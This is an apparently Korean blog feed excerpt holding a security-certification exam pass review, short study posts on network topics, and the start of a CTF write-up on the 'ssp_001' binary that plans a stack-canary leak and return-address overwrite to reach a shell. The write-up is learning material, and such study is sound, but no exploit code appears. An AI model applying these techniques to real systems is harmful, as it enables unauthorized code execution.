  &lt;li&gt;연필로 대강 중요해 보이는 부분에 밑줄을 쳐가면서 공부했다.
    &lt;ul&gt;
      &lt;li&gt;논리적으로 구멍이 있어 보이면 바로바로 메꾸고, 그 내용을 옆에 연필로 적어두었다.&lt;/li&gt;
      &lt;li&gt;즉, 내가 납득하고 내부적으로 재구성할 수 있을 때까지 이해했다.&lt;/li&gt;
      &lt;li&gt;부족한 연결고리는 검색으로 메웠다.&lt;/li&gt;
      &lt;li&gt;명령어를 치거나 시스템 관련한 것들은 직접 실습했다.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;배운 내용을 일상에 어떻게든 적용해 보았다.
    &lt;ul&gt;
      &lt;li&gt;사실 효과적인 공부 방법은 회독이 아니다. 회독은 오히려 공부가 안 된다. (관련해 논문도 있다)&lt;/li&gt;
      &lt;li&gt;가장 효과적인 공부법은 백지복습이다.&lt;/li&gt;
      &lt;li&gt;즉, 공부의 효율을 올리는 방법은 능동적인 응용이다.&lt;/li&gt;
      &lt;li&gt;따라서 일상 생활에 내가 배운 내용을 적용했다. 무선 네트워크를 공부한 날은 근처 전자제품 마트에 가서 무선 네트워크 상품들을 구경하며 공부했던 걸 응용해 상품의 기능과 스펙을 이해하는 식으로…&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;새로 공부하는 내용들에 어떻게 해서든 감상을 붙였다.
    &lt;ul&gt;
      &lt;li&gt;3과 비슷한 건데, 새로운 정보를 습득하는 순간에 어떻게든 태깅을 하는 것이다.&lt;/li&gt;
      &lt;li&gt;이렇게 하면 정보를 기억해내는 경로가 훨씬 많아져 더 효율적으로 기억할 수 있다. (나는 그렇다는 이야기다)&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;2회독을 할 땐 한 챕터에서 내가 공부하는 내용이 어느 지점에 있는지를 계속해서 상기했다.
    &lt;ul&gt;
      &lt;li&gt;교재는 독자에게 내용을 설명하기 위한 책이다. 즉, 큰 주제를 설명할 땐 반드시 전체의 흐름이 맞도록 소주제를 나열하고 그 아래에서도 흐름이 이어지도록 세부주제를 나열할 수밖에 없다.&lt;/li&gt;
      &lt;li&gt;따라서 같은 내용을 보더라도 지금 이 내용이 1) 큰 주제에서 2) 무엇을 설명하기 위해 3) 어떻게 기술된 내용인지를 알고 보는 것과 모르는 것은 천양지차다.&lt;/li&gt;
      &lt;li&gt;내가 습득하는 지식이 어떤 스토리를 가지고 있는지 큰 맵을 머릿속에 넣어놓는 것이 2회독의 목표였다.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;13-결과&quot;&gt;1.3. 결과&lt;/h2&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/cert-pass/Untitled.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;
&lt;mark&gt;평균 76점. 모든 과목에서 60점을 넘기며 필기에 합격했다.&lt;/mark&gt;&lt;/p&gt;

&lt;p&gt;과락 기준은 40점이지만 평균 60이 넘어야 합격인 시험인만큼 내 목표는 모든 과목 60점 이상이었다. 목표를 이룰 수 있어서 정말 기뻤고, 그와중에 왜 기타보안은 100점인 건지 어이가 없었으며, 시스템보안과 보안법규 쪽이 역시 약하구나 싶었다. 이 감상은 실기 준비에 큰 도움이 되었다.&lt;/p&gt;

&lt;p&gt;그리고 조금 당황스러웠던 게, 나는 PBT로 시험을 쳤는데-여기에 안드로이드 관련 문제가 나왔던 점이었다. 안드로이드를 찍먹한 덕에 맞았다. 이런 식으로 논외의 영역에서 나오는 문제들은 평소에 얼마나 다양한 분야에 관심을 가졌느냐가 정오답을 가르는구나 싶었다.&lt;/p&gt;

&lt;p&gt;틀린 문제는 전부 오답 분석을 했다.
&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;2-실기-230312--230422&quot;&gt;2. 실기 (23.03.12 ~ 23.04.22)&lt;/h1&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;20-배경-상황-설명&quot;&gt;2.0. 배경 상황 설명&lt;/h2&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;사실 3월 10일 필기를 치고 집에 와서 가채점을 하자마자 합격인 걸 알았기 때문에 4월 23일 실기시험은 3월 12일부터 준비를 시작했다.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;마지막 학기인 지금, 전공 한 과목을 포함해 16학점 수업을 듣고 있고…&lt;/li&gt;
  &lt;li&gt;나중에 해외 대학원 진학을 생각하고 있기 때문에 GPA도 굉장히 신경쓰고 있다.&lt;/li&gt;
  &lt;li&gt;그뿐 아니라 감사하게도(엉엉) 경찰청에 분과위원으로 참여중인 연구회에서 발표 제안을 받아서 그것도 준비하고 있었고…&lt;/li&gt;
  &lt;li&gt;정확히 기말고사 시즌과 겹치는 시험 일자였다.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;심적으로 압박을 많이 받았던 것 같다. 생리가 10일이나 밀렸거든…. 자궁이 실기시험날 유혈사태가 나지 않도록 눈치챙겨줬다 고맙다 이자식아ㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋ&lt;/p&gt;

&lt;p&gt;아무튼, 정말 바빴다. 그 상황에서 실기 준비를 하려니 밤에 세 시간 정도만을 낼 수 있었다. 거기다가 한 달 조금 더 되는 짧은 시간. 이건 고정값인 내 학습 능력보다는 유동값인 학습 전략을 잘 조정하는 게 현명해 보였고, 따라서 공시생 지인에게 공부법 자문을 구했다. (훈녀생정 #1. 모르면 전문가에게 자문을 구하자)&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;21-실기-교재&quot;&gt;2.1. 실기 교재&lt;/h2&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;알기사 실기 교재&lt;/li&gt;
  &lt;li&gt;알기사 실기 인강&lt;/li&gt;
  &lt;li&gt;KISA 주요정보통신기반시설 기술적 취약점 분석 평가 방법 상세가이드&lt;/li&gt;
  &lt;li&gt;데이터 3법 pdf&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;22-공부-방법&quot;&gt;2.2. 공부 방법&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;공부-시간-1&quot;&gt;공부 시간&lt;/h3&gt;

&lt;p&gt;앞서 말했듯 3월 11일부터 4월 22일까지 한 달 10일여의 시간이 있었고, 학교 수업과 병행해야 했기 때문에 하루 순공부 시간은 4시간이 나왔다. 밤에 3시간, 낮에 짬짬이 공부하며 1시간.&lt;/p&gt;

&lt;h3 id=&quot;공부-전략&quot;&gt;공부 전략&lt;/h3&gt;

&lt;p&gt;인강을 최대한 보고, 빈출되는 개념을 확인해 과목에 중요도를 부여한 다음, 현재 상황을 고려하여 과목별로 다른 공부법을 취하는 것이 요지였다.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;실기 인강을 결제했다. 동회차에 붙으리라는 생각을 못 했기 때문에 하루 강의를 1개 내지 2개 들었다. 그렇게 146강 중 28강 정도를 봤다. (원래는 24강을 봤는데, 추가 4개 강의는 유명한 시스템 해킹 기법을 다룬 거라 내가 모를 수가 없어서 그냥 계산에 넣었다)&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;실기 교재는 인강을 들은 부분만큼 정리하고 외웠다. 내가 직접 해볼 수 있는 건 직접 해봤다.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;필기 교재의 원하는 부분을 선정해 마인드맵을 만드는 형식으로 챕터 내용을 구조화했다.
    &lt;ul&gt;
      &lt;li&gt;앞서 1.3절에서 말했듯 나는 시스템보안과 보안법규가 약하고, 네트워크보안도 좀 약한 편임을 알아냈다.&lt;/li&gt;
      &lt;li&gt;정보보안기사 실기에서 빈출되는 테마들을 확인했고, 그 결과 네트워크보안(특히 DoS와 DDoS) ≥ 시스템보안 &amp;gt; 보안법규 &amp;gt; 그 외 과목 순으로 중요도가 높다는 결론을 내렸다.&lt;/li&gt;
      &lt;li&gt;따라서 현재 인강으로 듣고 있는 시스템보안은 인강에게 맡기고, 시간이 오래 걸리는 보안법규는 데이터 3법을 pdf로 만들어 쉬는 시간에 읽었으며, 네트워크보안을 마인드맵화했다.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;마지막 4일 동안은 문제를 눈으로 주구장창 풀었다. 이동 시간과 학교에서 자투리 시간은 취약점분석가이드를 읽는 데 썼다. 법규를 다 못 읽었지만 과감히 버렸다.
    &lt;ul&gt;
      &lt;li&gt;말 그대로 앉아서 하루종일 문제만 눈으로 풀었다. 원래 나는 논설문 쓰기를 잘하기 때문에 더 연습할 이유가 없었고, 따라서 손으로 쓰는 시간을 아끼기 위해서였다.&lt;/li&gt;
      &lt;li&gt;사실 이게 제일 도움됐다. 필기를 확실히 공부했기 때문에 문제 자체를 푸는 데 별 어려움이 없었고, 실기 강의를 들으면서 희미하게만 알던 걸 응용하며 암기한 데다가, 내가 부족한 부분을 알아내서 그 개념을 손으로 쓰고 정리하며 구멍을 메울 수 있었기 때문이다. 실제로 이렇게 구멍을 메운 부분이 시험에 나왔다.&lt;/li&gt;
      &lt;li&gt;법규를 다 못 읽었는데도 취약점분석가이드를 읽은 이유는, 출제자의 의도를 고려하면 3년차 정도 될 실무자의 실무능력을 측정하는 게 이 시험의 본질인 것 같은데 그렇다면 그 입장에서는 취약점분석가이드가 더 중요할 것 같아서였다.&lt;/li&gt;
      &lt;li&gt;그러나 마지막 4일만 취약점분석가이드에 투자한 이유는, 1) 법규 지식이 공백에 가까운 상태였고 2) 나는 내 배경지식으로 어느 정도의 취약점과 관련 코드를 이해하고 쓸 능력이 있었기 때문이었다. 즉 내 특성과 시간분배의 문제였다.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;그리고 기도했다. 진짜 손에 불이 나도록 기도했다. 제발!!! 제가 아는 내용이 나오게 해 주세요!!!! 제발!!!
    &lt;ul&gt;
      &lt;li&gt;당연하잖아. 이렇게 공부해도 전체의 30% 정도 공부한 거다. 그럼 이제 기도해야지…&lt;/li&gt;
      &lt;li&gt;그런데 그게 이루어졌습니다&lt;/li&gt;
      &lt;li&gt;다 아는 내용이 나왔고(IDS 관련 제외) 법규도 이전 프로젝트 + 재밌어 보여서 들었던 전공선택수업 때문에 하도 법조문을 읽어서 대충 생긴 감으로 때려맞출 정도의 내용이 나왔다. HTTPS 관련 문제도 필기 때 궁금해서 더 깊게 찾아봤던 문제가 나왔던 데다가 심지어 실무형 문제도 취약점분석가이드에서 읽으면서 호오… 재밌네… 했던 내용이 나왔다.&lt;/li&gt;
      &lt;li&gt;결론: 기도 열심히 해라. 아니면 사주팔자를 좋은 걸 받아서 끝장나는 운빨을 가져라(아님)(농담임)(알지???)&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;23-결과&quot;&gt;2.3. 결과&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/cert-pass/Untitled2.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/cert-pass/Untitled%201.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;mark&gt;69점으로 합격했다.&lt;/mark&gt; 난 한 61점으로 붙거나 59점으로 떨어질 거라고 생각했는데… 의외로 잘 봐서 어이가 없었다. 뭐지? 얼굴도 성함도 성별도 모르지만 채점관님 감사합니다.&lt;/p&gt;

&lt;p&gt;다시 한 번 말하지만 정말 운이 좋았다.&lt;/p&gt;

&lt;p&gt;필기 공부를 하면서 더 깊게 팠던 게 나왔던 것도, 
내가 원래도 잘 알았고 졸업 프로젝트를 하면서 신경썼던 SQL Injection이 나왔던 것도, 
그걸 취약점분석가이드에서 읽고 내가 몰랐던 대응도 있구나 재밌어했던 지점이 나왔던 것도, 
대충 법에서 의무를 부여하는 사업장의 규모는 월 100만명 이상이 방문하는 정보통신사업자구나 하는 감을 가지고 있던 것도, 
기출을 풀며 내가 부족하구나 싶어 손으로 쓰고 정리했던 리눅스/유닉스 로그 파일 문제가 나왔던 것도, 
기사 시험에 도움이 될 것 같아 네트워크 수업을 신청해 들었는데 거기에서 공부했던 내용이 나왔던 것도….&lt;/p&gt;

&lt;p&gt;이하 나열할 수도 없는 수많은 것들이 정말 하나같이 운이 좋았고 그래서 전체 문제 중 IDS 문제를 제외하고 뭐라도 써볼 수 있었다. 
조금이라도 더 깊이 있는 내용이 나왔다면 떨어졌을 거다. 그래서 정보보안기사 합격에 마냥 기뻐할 수가 없다.&lt;/p&gt;

&lt;p&gt;또한 여러 논문을 읽고 개인 프로젝트와 팀 프로젝트를 해본 후에 이 자격증을 공부해 보니 알겠다. 정보보안기사는 그냥 기본이 되었느냐를 묻는 자격증이다. 이 기본이 되어야 그 어떤 응용을 하더라도 더 깊은 이해와 효율을 보일 수 있다. 그래서 합격했다고 풀어질 수가 없다. 나는 과연 기본이 되었는가? 아니기 때문이다.&lt;/p&gt;

&lt;p&gt;그래서 원래 내가 목표했던 만큼의 공부는 전부 할 예정이다. 지금 이미 하고 있다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;이 시험을 준비하기 위해 정보를 찾다가 여기에 들어와 끝까지 읽은 당신에게 힘내라는 말을 하고 싶다. 그리고 꼭 붙으시라고도. 정말 힘든 시험이지만 그렇다고 죽을 만큼 힘들진 않더라고요. 할 만 합니다. 할 수 있어요. 화이팅.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;+) 추가. 그리고 완전 대박! 정보보안기사 공부를 했던 덕에 전공과목 중간고사에서는 내가 전체 수강생 중 유일한 만점자가 되었다. 감사합니다…. 감사합니다…. 문제의 칸은 좁은데 대체 어느 정도 depth까지 써야 할지 모르겠어서 최대한 간략하게 추려 썼는데 만점이었다. 난 정말 운이 좋은 사람이다. 행복!&lt;/p&gt;

&lt;hr /&gt;
</description>
        <pubDate>Sun, 28 May 2023 01:59:23 -0500</pubDate>
        <link>https://touBVa.github.io/blog/certification_study/cert_pass</link>
        <guid isPermaLink="true">https://touBVa.github.io/blog/certification_study/cert_pass</guid>
      </item>
    
      <item>
        <title>정보보안기사 실기 공부 - 네트워크 5대 관리 기능, SNMP, SSH</title>
        <description>&lt;p&gt;진짜 기염을 토하고 있다
다음달 시험… 어떻게든 한다 할 수 있다
안되면 슬픈 거고 되면 좋은 거고&lt;/p&gt;

&lt;p&gt;힘내보자구&lt;/p&gt;

&lt;p&gt;원본 다운로드 링크는 여기: &lt;a href=&quot;https://drive.google.com/file/d/1cFutSPS-RZeN69recbynrIiGjCUWTwnY/view?usp=sharing&quot;&gt;네트워크 5대 관리 기능, SNMP, SSH&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/24-SSH.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;
</description>
        <pubDate>Wed, 22 Mar 2023 01:59:23 -0500</pubDate>
        <link>https://touBVa.github.io/blog/certification_study/net-manage-snmp-ssh</link>
        <guid isPermaLink="true">https://touBVa.github.io/blog/certification_study/net-manage-snmp-ssh</guid>
      </item>
    
      <item>
        <title>정보보안기사 실기 공부 - 네트워크 장비와 VLAN</title>
        <description>&lt;p&gt;빨리 네트워크 분야 정리 끝내고 이제 애플리케이션 보안으로 넘어가야 하는데…
바빠 죽겠다. 그 와중에 16학점 막학기 듣는 나 자신 칭찬… 아니 멍청해….&lt;/p&gt;

&lt;p&gt;원본 다운로드 링크는 여기: &lt;a href=&quot;https://drive.google.com/file/d/1QdPDOghp6KK79NhfzaS5wLzb_hUJxxXb/view?usp=sharing&quot;&gt;네트워크 장비와 VLAN 정리&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/22-VLAN.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;
</description>
        <pubDate>Tue, 21 Mar 2023 23:22:23 -0500</pubDate>
        <link>https://touBVa.github.io/blog/certification_study/net-gadgets-vlan</link>
        <guid isPermaLink="true">https://touBVa.github.io/blog/certification_study/net-gadgets-vlan</guid>
      </item>
    
      <item>
        <title>정보보안기사 실기 공부 - VPN과 IPSec</title>
        <description>&lt;p&gt;정보보안기사 필기에 합격하고 실기를 준비하고 있다.
필기 준비할 때 공부했던 내용들을 나만의 방식으로 구조화하면 좋을 것 같아 마인드맵을 그리고 있는데,
이번에 VPN과 그를 구현하는 프로토콜, 그리고 그 중에서도 IPSec에 대해 공부하며 마인드맵을 완성했다.
어쨌든 다같이 보면 좋으니까…. 그리고 블로그에 너무 오래 업로드를 못하기도 했고… 그래서 업로드해본다.&lt;/p&gt;

&lt;p&gt;원본 다운로드 링크는 여기: &lt;a href=&quot;https://drive.google.com/file/d/11ylPfRzMMb01oYBUtbozxztNKRqANgxT/view?usp=sharing&quot;&gt;VPN 정리&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/VPN.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;
</description>
        <pubDate>Fri, 17 Mar 2023 00:22:23 -0500</pubDate>
        <link>https://touBVa.github.io/blog/certification_study/net_vpn</link>
        <guid isPermaLink="true">https://touBVa.github.io/blog/certification_study/net_vpn</guid>
      </item>
    
      <item>
        <title>System Hacking Step 6: ssp_001</title>
        <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#1-코드-분석&quot; id=&quot;markdown-toc-1-코드-분석&quot;&gt;1. 코드 분석&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#11-사용된-함수-목록-확인&quot; id=&quot;markdown-toc-11-사용된-함수-목록-확인&quot;&gt;1.1. 사용된 함수 목록 확인&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#12-main-함수의-어셈블리-확인&quot; id=&quot;markdown-toc-12-main-함수의-어셈블리-확인&quot;&gt;1.2. main 함수의 어셈블리 확인&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#121-함수-branch-별-행동-확인&quot; id=&quot;markdown-toc-121-함수-branch-별-행동-확인&quot;&gt;1.2.1. 함수 branch 별 행동 확인&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#122-선택지-f의-경우&quot; id=&quot;markdown-toc-122-선택지-f의-경우&quot;&gt;1.2.2. 선택지 [F]의 경우&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#123-선택지-p의-경우&quot; id=&quot;markdown-toc-123-선택지-p의-경우&quot;&gt;1.2.3. 선택지 [P]의 경우&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#124-선택지-e의-경우&quot; id=&quot;markdown-toc-124-선택지-e의-경우&quot;&gt;1.2.4. 선택지 [E]의 경우&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#2-취약점-지정-및-익스플로잇-방법-선정&quot; id=&quot;markdown-toc-2-취약점-지정-및-익스플로잇-방법-선정&quot;&gt;2. 취약점 지정 및 익스플로잇 방법 선정&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#21-분석-요약-및-필요한-정보-선정&quot; id=&quot;markdown-toc-21-분석-요약-및-필요한-정보-선정&quot;&gt;2.1. 분석 요약 및 필요한 정보 선정&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#22-필요한-정보-알아내기&quot; id=&quot;markdown-toc-22-필요한-정보-알아내기&quot;&gt;2.2. 필요한 정보 알아내기&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#221-p-옵션상에서-사용자-입력값으로-무엇을-줘야-canary-leak이-가능할까&quot; id=&quot;markdown-toc-221-p-옵션상에서-사용자-입력값으로-무엇을-줘야-canary-leak이-가능할까&quot;&gt;2.2.1. [P] 옵션상에서, 사용자 입력값으로 무엇을 줘야 Canary Leak이 가능할까?&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#222-e-옵션-실행-시-삽입될-페이로드-구성은-어떻게-해야-할까&quot; id=&quot;markdown-toc-222-e-옵션-실행-시-삽입될-페이로드-구성은-어떻게-해야-할까&quot;&gt;2.2.2. [E] 옵션 실행 시 삽입될 페이로드 구성은 어떻게 해야 할까?&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#223-리턴-어드레스는-어디로-조작해야-할까&quot; id=&quot;markdown-toc-223-리턴-어드레스는-어디로-조작해야-할까&quot;&gt;2.2.3. 리턴 어드레스는 어디로 조작해야 할까?&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#23-취약점-익스플로잇-시나리오-세우기&quot; id=&quot;markdown-toc-23-취약점-익스플로잇-시나리오-세우기&quot;&gt;2.3. 취약점 익스플로잇 시나리오 세우기&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#3-익스플로잇-작성-후-실행&quot; id=&quot;markdown-toc-3-익스플로잇-작성-후-실행&quot;&gt;3. 익스플로잇 작성 후 실행&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;1-코드-분석&quot;&gt;1. 코드 분석&lt;/h1&gt;

&lt;p&gt;이 문제는 코드와 바이너리를 함께 제시해 주는 문제다. 그러나 더 깊은 공부를 위해 코드가 주어지지 않았다는 가정 하에서 문제를 풀기 위해 바이너리를 분석해 보았다. 설명하기에 앞서, 바이너리만 주어진 상황에서의 분석 순서는 동적 분석 → 정적 분석이라는 점을 강조하고 싶다. 해당 바이너리가 어떤 행위를 하는지 추상적으로 알고 있어야 정적 분석을 할 때 중요한 포인트를 찾아가는 지표를 가질 수 있기 때문이다. 따라서, 아래에 이어지는 바이너리 정적 분석은 동적 분석이 이미 이루어졌다는 것을 전제로 한다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;11-사용된-함수-목록-확인&quot;&gt;1.1. 사용된 함수 목록 확인&lt;/h2&gt;

&lt;p&gt;먼저 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ssp_001&lt;/code&gt; 바이너리에 gdb를 물려 해당 바이너리 내부에서 사용되었던 functions들의 목록을 찾아 보았다. 바이너리가 ripped 되지 않았고, 난독화되지 않은 상태라면 쉽게 functions들의 목록을 불러올 수 있을 것이다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/ssp_001/Untitled.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;당장 확인되는 functions들 중 눈에 띄는 건 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system@plt&lt;/code&gt; 와 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;get_shell&lt;/code&gt; 이다. 전자가 존재한다는 것은 타겟 시스템에 ASLR이 걸려 있더라도 got, plt overwrite 방식으로 우회하여 쉘을 딸 수 있다는 의미이고, 후자는 누가 봐도 함수의 코드 플로우를 조작해 접근해야 하는 목표물처럼 보이기 때문이다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;12-main-함수의-어셈블리-확인&quot;&gt;1.2. main 함수의 어셈블리 확인&lt;/h2&gt;

&lt;p&gt;이제 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main&lt;/code&gt; 함수의 어셈블리를 확인해 보자.&lt;/p&gt;

&lt;p&gt;카나리를 다루는 모습이다. 32비트 프로그램이므로 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ebp-0x8&lt;/code&gt; 에 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gs:0x14&lt;/code&gt; 가 들어간다. 관련한 내용은 &lt;a href=&quot;https://toubva.github.io/blog/dreamhack_system_hacking/step6-1#/&quot;&gt;여기&lt;/a&gt;에서 복습하자!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/ssp_001/Untitled%201.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;121-함수-branch-별-행동-확인&quot;&gt;1.2.1. 함수 branch 별 행동 확인&lt;/h3&gt;

&lt;p&gt;해당 바이너리의 실행 모습(선택지가 나오고, 사용자가 선택한 선택지에 따라 다른 내용의 프로그램 branch가 전개되는 형식)을 감안했을 때, 아마 main 함수 혹은 선택지를 제시하기 위해 call 되는 함수 내부에는 최소 3개 이상의 cmp-jmp 구문이 존재할 것이다. 해당 구간을 찾아 보았다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/ssp_001/Untitled%202.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;추측이 맞았다. 3개의 cmp-jmp 쌍이 존재했고, 각각의 쌍은 main 함수의 특정 부분으로 점프하는 모습을 보여준다. main 함수 내부에서 모든 작업이 이루어지는 것으로 생각되며, 해당 구문은 if - if - if - else 형식의 문법을 취하고 있는 것으로 보인다. 또한 cmp하는 대상이 각각 아스키 코드로 ‘F’, ‘P’, ‘E’인 것으로 봤을 때, 프로그램을 실행했을 때 바로 나오는 아래의 선택지 부분임을 알 수 있다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/ssp_001/Untitled%203.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;이제 각 선택지에 따른 동작을 확인해 보자.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;122-선택지-f의-경우&quot;&gt;1.2.2. 선택지 [F]의 경우&lt;/h3&gt;

&lt;p&gt;선택지 P의 경우인 어셈블리 라인은 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main+192&lt;/code&gt; 부터 시작하므로 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main+155~main+187&lt;/code&gt; 까지의 라인이 선택지 F에 해당된다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/ssp_001/Untitled%204.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;해당 라인의 핵심은 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;read&lt;/code&gt; 함수와 연관이 깊어 보인다. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;read(0, eax([ebp-0x88]), 0x40)&lt;/code&gt; 을 호출하는 정황으로 미루어 보았을 때, 사용자의 input 0x40개를 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ebp-0x88&lt;/code&gt; 에 저장하는 것으로 보인다. 아마 실제 소스에서는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;read(0, buf, 0x40)&lt;/code&gt;쯤 될 것이다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;123-선택지-p의-경우&quot;&gt;1.2.3. 선택지 [P]의 경우&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/ssp_001/Untitled%205.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

